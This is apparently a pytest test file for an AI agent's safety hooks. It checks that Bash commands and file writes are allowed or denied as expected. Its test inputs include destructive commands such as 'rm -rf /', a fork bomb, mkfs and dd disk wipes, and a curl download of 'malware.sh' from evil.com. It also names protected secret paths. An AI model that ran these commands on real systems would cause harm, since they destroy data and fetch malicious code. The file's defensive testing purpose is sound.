from __future__ import annotations

import pytest

from maverick.hooks.config import SafetyConfig
from maverick.hooks.safety import (
    expand_variables,
    normalize_command,
    parse_compound_command,
    validate_bash_command,
)


class TestNormalizeCommand:
    """Tests for unicode/escape normalization."""

    def test_unicode_normalization(self) -> None:
        """Test unicode NFC normalization."""
        result = normalize_command("rm\u0020-rf")  # Non-breaking space
        assert result == "rm -rf"

    def test_escape_sequences(self) -> None:
        """Test common escape sequence handling."""
        result = normalize_command("rm\\x20-rf")
        assert "rm" in result and "-rf" in result

    def test_tab_normalization(self) -> None:
        """Test tab characters are normalized."""
        result = normalize_command("rm\t-rf")
        assert "rm" in result and "-rf" in result


class TestExpandVariables:
    """Tests for environment variable expansion."""

    def test_expand_home(self) -> None:
        """Test $HOME expansion."""
        import os

        result = expand_variables("rm -rf $HOME")
        assert os.environ.get("HOME", "/home") in result or "rm -rf" in result

    def test_expand_braces(self) -> None:
        """Test ${VAR} expansion."""
        import os

        os.environ["TEST_VAR"] = "/test/path"
        result = expand_variables("cat ${TEST_VAR}/file")
        assert "/test/path" in result
        del os.environ["TEST_VAR"]

    def test_expansion_in_quotes(self) -> None:
        """os.path.expandvars expands even inside single quotes."""
        result = expand_variables("echo '$HOME'")
        # expandvars does NOT respect shell quoting — $HOME is expanded
        import os

        assert os.environ["HOME"] in result


class TestParseCompoundCommand:
    """Tests for compound command parsing."""

    def test_simple_command(self) -> None:
        """Test single command."""
        result = parse_compound_command("ls -la")
        assert result == ["ls -la"]

    def test_and_operator(self) -> None:
        """Test && operator splitting."""
        result = parse_compound_command("cd /tmp && rm -rf *")
        assert len(result) == 2
        assert "cd /tmp" in result[0]
        assert "rm -rf" in result[1]

    def test_or_operator(self) -> None:
        """Test || operator splitting."""
        result = parse_compound_command("test -f file || echo 'not found'")
        assert len(result) == 2

    def test_semicolon(self) -> None:
        """Test ; separator."""
        result = parse_compound_command("echo a; echo b")
        assert len(result) == 2

    def test_pipe(self) -> None:
        """Test | pipe."""
        result = parse_compound_command("cat file | grep pattern")
        assert len(result) == 2

    def test_quoted_string_preserved(self) -> None:
        """Test that quoted strings containing operators are preserved."""
        result = parse_compound_command("echo 'a && b'")
        assert len(result) == 1


class TestValidateBashCommand:
    """Tests for bash command validation."""

    @pytest.mark.asyncio
    async def test_allows_safe_command(self) -> None:
        """Test that safe commands are allowed."""
        input_data = {"tool_name": "Bash", "tool_input": {"command": "ls -la"}}
        result = await validate_bash_command(input_data, None, None)
        assert result == {}

    @pytest.mark.asyncio
    async def test_blocks_rm_rf_root(self) -> None:
        """Test blocking rm -rf /."""
        input_data = {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}}
        result = await validate_bash_command(input_data, None, None)
        assert "hookSpecificOutput" in result
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_blocks_rm_rf_home(self) -> None:
        """Test blocking rm -rf ~."""
        input_data = {"tool_name": "Bash", "tool_input": {"command": "rm -rf ~"}}
        result = await validate_bash_command(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_blocks_fork_bomb(self) -> None:
        """Test blocking fork bomb."""
        input_data = {"tool_name": "Bash", "tool_input": {"command": ":(){ :|:& };:"}}
        result = await validate_bash_command(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_blocks_mkfs(self) -> None:
        """Test blocking mkfs commands."""
        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "mkfs.ext4 /dev/sda1"},
        }
        result = await validate_bash_command(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_blocks_dd(self) -> None:
        """Test blocking dd with dangerous output."""
        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "dd if=/dev/zero of=/dev/sda"},
        }
        result = await validate_bash_command(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_blocks_shutdown(self) -> None:
        """Test blocking shutdown commands."""
        for cmd in ["shutdown now", "reboot", "halt", "poweroff"]:
            input_data = {"tool_name": "Bash", "tool_input": {"command": cmd}}
            result = await validate_bash_command(input_data, None, None)
            assert result["hookSpecificOutput"]["permissionDecision"] == "deny", (
                f"Failed to block: {cmd}"
            )

    @pytest.mark.asyncio
    async def test_blocks_compound_with_dangerous(self) -> None:
        """Test blocking compound commands containing dangerous patterns."""
        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "echo hello && rm -rf /"},
        }
        result = await validate_bash_command(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_custom_blocklist(self) -> None:
        """Test custom blocklist patterns."""
        config = SafetyConfig(bash_blocklist=[r"curl.*evil\.com"])
        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://evil.com/malware.sh"},
        }
        result = await validate_bash_command(input_data, None, None, config=config)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_allow_override(self) -> None:
        """Test allow override patterns."""
        config = SafetyConfig(bash_allow_override=[r"rm -rf node_modules"])
        input_data = {
            "tool_name": "Bash",
            "tool_input": {"command": "rm -rf node_modules"},
        }
        result = await validate_bash_command(input_data, None, None, config=config)
        # This should be allowed despite containing rm -rf
        assert result == {}

    @pytest.mark.asyncio
    async def test_fail_closed_on_exception(self) -> None:
        """Test fail-closed behavior when hook raises exception."""
        # Passing None command should trigger exception but fail closed
        input_data = {
            "tool_name": "Bash",
            "tool_input": {},  # Missing command
        }
        result = await validate_bash_command(input_data, None, None)
        # Should block (fail closed)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_fail_open_when_configured(self) -> None:
        """Test fail-open behavior when configured (T090)."""
        config = SafetyConfig(fail_closed=False)
        # Force an exception by mocking something or passing bad data.
        # Passing bad data (None for command) triggers exception in logic
        # before it handles it. Actually in the code:
        # tool_input = input_data.get("tool_input", {})
        # command = tool_input.get("command", "")
        # if not command: return _deny_response...
        # So empty command is handled. We need to cause an exception
        # *during* validation. Mock parse_compound_command to raise.

        from unittest.mock import patch

        with patch(
            "maverick.hooks.safety.parse_compound_command",
            side_effect=ValueError("Parse error"),
        ):
            input_data = {
                "tool_name": "Bash",
                "tool_input": {"command": "ls -la"},
            }
            # Should return empty dict (allow) because fail_closed=False
            try:
                result = await validate_bash_command(
                    input_data, None, None, config=config
                )
                assert result == {}
            except Exception:
                pytest.fail("Should not raise exception when fail_closed=False")


class TestNormalizePath:
    """Tests for path normalization."""

    def test_expand_home(self) -> None:
        """Test ~ expansion."""
        import os

        from maverick.hooks.safety import normalize_path

        result = normalize_path("~/.ssh/id_rsa")
        assert os.path.expanduser("~") in result

    def test_resolve_relative(self) -> None:
        """Test relative path resolution."""
        from maverick.hooks.safety import normalize_path

        result = normalize_path("./file.txt")
        assert result.startswith("/")


class TestValidateFileWrite:
    """Tests for file write validation."""

    @pytest.mark.asyncio
    async def test_allows_normal_file(self) -> None:
        """Test that normal file writes are allowed."""
        from maverick.hooks.safety import validate_file_write

        input_data = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/tmp/test.txt"},
        }
        result = await validate_file_write(input_data, None, None)
        assert result == {}

    @pytest.mark.asyncio
    async def test_blocks_env_file(self) -> None:
        """Test blocking .env file writes."""
        from maverick.hooks.safety import validate_file_write

        input_data = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/project/.env"},
        }
        result = await validate_file_write(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_blocks_env_local(self) -> None:
        """Test blocking .env.local file writes."""
        from maverick.hooks.safety import validate_file_write

        input_data = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/project/.env.local"},
        }
        result = await validate_file_write(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_blocks_ssh_directory(self) -> None:
        """Test blocking ~/.ssh/ writes."""
        import os

        from maverick.hooks.safety import validate_file_write

        ssh_path = os.path.expanduser("~/.ssh/id_rsa")
        input_data = {"tool_name": "Write", "tool_input": {"file_path": ssh_path}}
        result = await validate_file_write(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_blocks_etc_directory(self) -> None:
        """Test blocking /etc/ writes."""
        from maverick.hooks.safety import validate_file_write

        input_data = {"tool_name": "Write", "tool_input": {"file_path": "/etc/passwd"}}
        result = await validate_file_write(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_blocks_secrets_directory(self) -> None:
        """Test blocking secrets/ writes."""
        from maverick.hooks.safety import validate_file_write

        input_data = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/project/secrets/api_key.txt"},
        }
        result = await validate_file_write(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_custom_allowlist(self) -> None:
        """Test custom path allowlist."""
        from maverick.hooks.config import SafetyConfig
        from maverick.hooks.safety import validate_file_write

        config = SafetyConfig(path_allowlist=[".env.example"])
        input_data = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/project/.env.example"},
        }
        result = await validate_file_write(input_data, None, None, config=config)
        assert result == {}

    @pytest.mark.asyncio
    async def test_custom_blocklist(self) -> None:
        """Test custom path blocklist."""
        from maverick.hooks.config import SafetyConfig
        from maverick.hooks.safety import validate_file_write

        config = SafetyConfig(path_blocklist=["config/production/"])
        input_data = {
            "tool_name": "Write",
            "tool_input": {"file_path": "/project/config/production/settings.json"},
        }
        result = await validate_file_write(input_data, None, None, config=config)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_fail_closed_on_exception(self) -> None:
        """Test fail-closed behavior on exception."""
        from maverick.hooks.safety import validate_file_write

        input_data = {
            "tool_name": "Write",
            "tool_input": {},  # Missing file_path
        }
        result = await validate_file_write(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.asyncio
    async def test_fail_open_on_exception_configured(self) -> None:
        """Test fail-open behavior on exception when configured (T091)."""
        from unittest.mock import patch

        from maverick.hooks.config import SafetyConfig
        from maverick.hooks.safety import validate_file_write

        config = SafetyConfig(fail_closed=False)

        # Force exception by mocking normalize_path
        with patch(
            "maverick.hooks.safety.normalize_path", side_effect=ValueError("Path error")
        ):
            input_data = {
                "tool_name": "Write",
                "tool_input": {"file_path": "/tmp/test.txt"},
            }
            try:
                result = await validate_file_write(
                    input_data, None, None, config=config
                )
                assert result == {}
            except Exception:
                pytest.fail("Should not raise exception when fail_closed=False")

    @pytest.mark.asyncio
    async def test_edit_tool_also_blocked(self) -> None:
        """Test that Edit tool is also validated."""
        from maverick.hooks.safety import validate_file_write

        input_data = {"tool_name": "Edit", "tool_input": {"file_path": "/etc/hosts"}}
        result = await validate_file_write(input_data, None, None)
        assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
